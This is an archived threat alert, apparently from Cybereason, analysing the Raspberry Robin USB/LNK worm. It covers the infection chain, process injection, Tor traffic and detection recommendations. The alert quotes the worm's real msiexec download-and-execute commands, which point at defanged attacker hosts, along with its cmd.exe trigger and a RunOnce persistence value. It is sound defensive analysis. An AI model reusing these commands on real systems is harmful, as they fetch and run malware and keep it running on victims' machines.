{
    "id": "800e0349-ffd3-47f9-ac77-0311f67ac6d2",
    "created_at": "2023-01-12T15:06:44.738923Z",
    "updated_at": "2025-03-27T02:05:19.43004Z",
    "deleted_at": null,
    "sha1_hash": "c8a4cc241743252dadcb5f25bf412481e5c0e272",
    "title": "2022-07-07 - THREAT ALERT- Raspberry Robin Worm Abuses Windows Installer and QNAP Devices",
    "authors": "",
    "file_creation_date": "2022-07-18T18:08:31Z",
    "file_modification_date": "2022-07-18T18:08:31Z",
    "file_size": 2792778,
    "plain_text": "# THREAT ALERT: Raspberry Robin Worm Abuses Windows Installer and QNAP Devices\n\n**[cybereason.com/blog/threat-alert-raspberry-robin-worm-abuses-windows-installer-and-qnap-devices](https://www.cybereason.com/blog/threat-alert-raspberry-robin-worm-abuses-windows-installer-and-qnap-devices)**\n\nWritten By\nCybereason Global SOC Team\n\nJuly 7, 2022\n|\n5 minute read\n\n\n-----\n\nThe [Cybereason Global Security Operations Center (SOC) Team issues](https://www.cybereason.com/blog/authors/cybereason-global-soc-team) Cybereason Threat\nAlerts to inform customers of emerging impacting threats. The Alerts summarize these\nthreats and provide practical recommendations for protecting against them.\n\n## What's Happening?\n\nThe Cybereason team is investigating a series of recent infections with the Raspberry Robin\ncampaign, also associated with the name “LNK Worm.” Raspberry Robin involves a worm\nthat spreads over USB devices or shared folders, leveraging compromised QNAP (Network\nAttached Storage or NAS) devices as stagers. It uses an old but still effective method of\nusing “LNK” shortcut files to lure its victims.\n\n## Key Observations\n\nRaspberry Robin is a spreading threat, using specifically crafted Microsoft links (LNK\nfiles) to infect its victims. Cybereason observed delivery through file archives,\nremovable devices (USB) or ISO files.\nRaspberry Robin is a persistent threat. Once the malware infects a machine, it\nestablishes persistence by running at every system startup.\nCybereason observed a majority of the victims being located in Europe.\nThe [Cybereason Defense Platform detects and prevents Raspberry Robin activities](https://www.cybereason.com/platform/xdr)\n\n## Analysis\n\nThis section describes the different processes that we observed, involved in Raspberry\nRobin infections. The following diagram represents the overall malicious activity seen in a\nRaspberry Robin infection chain:\n\n_Summarized infection process for Raspberry Robin_\n\nThe GSOC team summarizes a Raspberry Robin infection as follows :\n\n\n-----\n\nThe Raspberry Robin-related infections start from two files present in the same\ndirectory hosted on an external device or shared drive:\n\n[a “LNK” file that contains a Windows shell command](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943)\nanother file that acts as a “BAT” file, filled with padding data and two specific\ncommands\n[Raspberry Robin leverages the LOLBin called “msiexec.exe” to download and execute](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)\na malicious shared library (DLL) from a compromised NAS device from the vendor\n“QNAP”.\nTo make it harder to detect, Raspberry Robin:\n\nleverages process injections in three legitimate Windows system processes\ncommunicates with the rest of Raspberry Robin’s infrastructure through Tor (The\nOnion Router) Exit nodes\nTo persist on the infected system, Raspberry Robin uses a registry key to automatically\n[load a malicious module through the Windows binary “rundll32.exe”, at the machine](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)\nstartup.\n\n### Infection Process\n\nBased on public samples we analyzed (i.e. MD5 hash\n22531e030b05dbaafe9932b8779c73f6), the initial set of two files can be present on an\nexternal storage device or simply in a compressed archive. It contains:\n\nA LNK file (i.e. “USB Drive.lnk”), which is the initial infection trigger, and contains the\nfirst “cmd.exe” execution, such as C:\\Windows\\System32\\cmd.exe\" /r tYPE\n**xPhfK.Usb|CmD.**\nAnother file, xPhfK.Usb, which contains random binary data as well as two commands:\n**explorer.exe ADATA uFD and mSIExEC /Q -**\n**I\"hTTP://u0[.]pm:8080/80wOpGuotSU/USER-PC?admin\" “ to download and execute**\na second attack stage:\n\n_Example content of the public sample 22531e030b05dbaafe9932b8779c73f6_\n\n\n-----\n\n_Process cmd.exe taking content of “WYcZ.CFg” file as an input to execute “process_\n_msiexec.exe” as seen in the Cybereason Defense Platform_\n\nThe fact that the initial “cmd.exe” spawns from the “explorer.exe” process is the result of\n“LNK” files execution.\n\n### Download and Execute\n\nThe initial infection vector launches “msiexec.exe” with a full malicious URL as an argument\nas well as “[/-]q” (quiet mode) and “[/-]i” (normal installation mode). Amongst the different\nattacks observed, the arguments are ordered differently and use different patterns, for\nexample with or without a space.\n\nAn example pattern for this command is:\n\n**msIEXeC -Q/i \"\"htTP://6y[.]RE:8080/5CBniie70Rw/[Machine name]=[Victim user name]\"**\n(where the machine name and victim name are replaced by actual values).\n\nAs the normal installation proceeds, the msiexec.exe command listed above creates\nanother msiexec.exe /V process, launched from services.exe.\n\nThis second msiexec.exe /V process then spawns a third msiexec.exe process, which\nloads a malicious module named msi[...].tmp and is the malware stage downloaded from its\nparent msiexec.exe /V process:\n\n\n-----\n\n_Process “msiexec.exe” downloading content from the domain “6y[.]re” pointing to a QNAP_\n_compromised device as seen in the Cybereason Defense Platform_\n\n\n-----\n\n_[Extract from “https://www.shodan.io/host/195.158.67.252”, showing that the server that](https://www.shodan.io/host/195.158.67.252)_\n_resolves from “6y[.]re” is a QNAP device with a service hosted on TCP port 8080_\n\n### Spread Through Process Injection\n\nThe next step for this threat is to inject itself into other processes, namely “rundll32.exe,”\n“dllhost.exe” and “regsvr32.exe” on the observed victims. The Cybereason Defense Platform\ndetects this injection and can help to link the creator process and the created ones.\n\nThe number of injected system processes is generally high (between 50 and 300) and some\nof these processes communicate with TOR (The Onion Router) exit nodes:\n\n\n-----\n\n_Raspberry Robin injecting system processes, which then communicate with TOR-related IP_\n_addresses, as seen in the Cybereason Defense Platform_\n\n### Persistence\n\nRaspberry Robin installs itself into a registry “run” key in the Windows user’s hive, for\nexample:\n\n“Hku\\[GUID]\\software\\microsoft\\windows\\currentversion\\runonce\\vayp” with value\n“RUNDLL32 SHELL32.DLL,ShellExec_RunDLLA REGSVR32.EXE /u -S \"C:\\Users\\\n\n[UserName]\\AppData\\Local\\Temp\\cnsbi.mh.\"\n\nAs a result, “rundll32.exe” loads the same DLL as the one which the initial “msiexec.exe”\nprocess downloaded in the infection stage. It then proceeds with the same process injection\nand communication as described above.\n\nThe loaded DLL has a random extension (pi.loc, cr.mf, etc.) and “rundll32.exe” loads it with a\n“.” at the end:\n\n\n-----\n\n_Process tree showing the persistence mechanisms used by Raspberry Robin as seen in the_\n_Cybereason Defense Platform_\n\nRegarding the persistence aspects, the following diagram represents the way the malicious\nmodule executes at each machine startup:\n\n_Raspberry Robin persistence process following an initial infection and running at each_\n_machine boot_\n\nAs the malicious module is the same one as during the initial infection process, it displays\nthe same malicious activities involving process injection and communication with Tor exit\nnodes.\n\nThis module contains specific indicators, including the fact that it masquerades as an Apache\nshared library (DLL) called “libapriconv-1.dll”:\n\n\n-----\n\n_Raspberry Robin leverages malicious module loading masquerading as Apache shared_\n_libraries (DLL)_\n\nThe other samples the GSOC team identified on other Raspberry Robin cases also use\ndifferent masquerading processes (for instance, impersonating “QT 5”).\n\nThis specific module is also peculiar due to the fact that the chain of certification is broken,\nmaking it signed but not verified by the Windows system. The code signing name is\n“OmniContact” and can be used as a filter on VirusTotal.com to check for similar samples.\n\n\n-----\n\n_Excerpt from virustotal.com showing a sample detailed information_\n\nIn 75% of the observed victims, the malicious module downloaded by Raspberry Robin was\nsigned by “OmniContact.”\n\n### Network Communications\n\nFinally, the victim devices of Raspberry Robin created a high amount of network packets to\nTOR exit nodes. The GSOC team observed that the TCP ports used were 80, 443 and 8080.\n\n## Cybereason Recommendations\n\n\n-----\n\nThe [Cybereason Defense Platform detects and prevents Raspberry Robin infections in](https://www.cybereason.com/platform#graphic)\nMicrosoft products. Cybereason recommends the following:\n\nBlock outgoing connections (outside of the organization) to TOR-related addresses, as\nRaspberry Robin actively communicates with TOR exit nodes.\nAs Raspberry Robin displays persistence mechanisms and establishes many\nmasquerading actions on the infected system, re-image infected devices.\nThreat Hunting with Cybereason: The Cybereason MDR team provides its customers\nwith custom hunting queries for detecting specific threats - to find out more about threat\n[hunting and Managed Detection and Response with the Cybereason Defense Platform,](https://www.cybereason.com/platform/managed-detection-response-mdr)\n[contact a Cybereason Defender here.](https://www.cybereason.com/services/managed-detection-response-mdr#form)\n\n[For Cybereason customers: More details available on the NEST including custom](https://nest.cybereason.com/knowledgebase/6125511)\nthreat hunting queries for detecting this threat:\n\n_The Cybereason Defense Platform detects Raspberry Robin initial access method_\n\n_The Cybereason Defense Platform detects the Raspberry Robin malicious module loading_\n\n## About the Researcher\n\n\n-----\n\n**Loïc Castel, Principal Security Analyst, Cybereason Global**\n\n**SOC**\n\nLoïc Castel is a Principal Security Analyst with the Cybereason Global SOC team. Loïc\nanalyses and researches critical incidents and cybercriminals, in order to better detect\ncompromises. In his career, Loïc worked as a security auditor in well-known organizations\nsuch as ANSSI (French National Agency for the Security of Information Systems) and as\nLead Digital Forensics & Incident Response at Atos. Loïc loves digital forensics and incident\nresponse, but is also interested in offensive aspects such as vulnerability research.\n\nAbout the Author\n\n**Cybereason Global SOC Team**\n\n\n-----\n\nThe Cybereason Global SOC Team delivers 24/7 Managed Detection and Response\nservices to customers on every continent. Led by cybersecurity experts with experience\nworking for government, the military and multiple industry verticals, the Cybereason Global\nSOC Team continuously hunts for the most sophisticated and pervasive threats to support\nour mission to end cyberattacks on the endpoint, across the enterprise, and everywhere the\nbattle moves.\n\n[All Posts by Cybereason Global SOC Team](https://www.cybereason.com/blog/authors/cybereason-global-soc-team)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-07 - THREAT ALERT- Raspberry Robin Worm Abuses Windows Installer and QNAP Devices.pdf"
    ],
    "report_names": [
        "2022-07-07 - THREAT ALERT- Raspberry Robin Worm Abuses Windows Installer and QNAP Devices.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536004,
    "ts_updated_at": 1743041119,
    "ts_creation_date": 1658167711,
    "ts_modification_date": 1658167711,
    "files": {
        "pdf": "https://archive.orkl.eu/c8a4cc241743252dadcb5f25bf412481e5c0e272.pdf",
        "text": "https://archive.orkl.eu/c8a4cc241743252dadcb5f25bf412481e5c0e272.txt",
        "img": "https://archive.orkl.eu/c8a4cc241743252dadcb5f25bf412481e5c0e272.jpg"
    }
}